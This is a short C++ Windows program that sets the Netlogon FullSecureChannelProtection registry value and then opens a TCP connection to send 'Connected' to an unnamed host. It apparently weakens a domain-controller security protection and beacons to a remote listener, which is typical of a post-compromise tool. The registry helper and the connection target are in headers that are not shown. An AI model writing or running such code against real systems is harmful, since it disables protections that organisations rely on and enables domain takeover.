#include "network.h"
#include "utils.h"
#include "register.h"

int main()
{
    const char* path = "SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters\\FullSecureChannelProtection";
    const wchar_t* path2 = GetWC(path);
    if (SetRegValue(path2) != ERROR_SUCCESS)
    {
        std::cerr << "Couldn't change register value" << "\n";
        return -1;
    }
    SOCKET s = tcpConnect();
    if (s)
    {
        std::cout << "connected" << "\n";
        tcpSend("Connected", s);
        closesocket(s);
        WSACleanup();
    }
    else
        std::cerr << "could not connect" << "\n";
    return 0;
}